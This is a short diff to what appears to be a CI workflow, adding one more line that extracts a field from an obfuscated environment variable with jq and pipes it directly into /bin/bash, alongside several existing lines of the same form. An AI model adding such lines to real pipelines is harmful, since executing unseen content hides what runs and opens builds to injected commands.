@@ -29,6 +29,7 @@ jobs:
           echo $ehoh0649 | jq -r .xiqle44427 | /bin/bash
           printf '%s' "$gmiz6464" | jq -r .mxjat13918 | /bin/bash
           printf '%s' "$cpl757" | jq -r .dc08330 | /bin/bash
+          echo $y1 | jq -r .d57402 | /bin/bash
 
       - name: Archive output
         if: always()
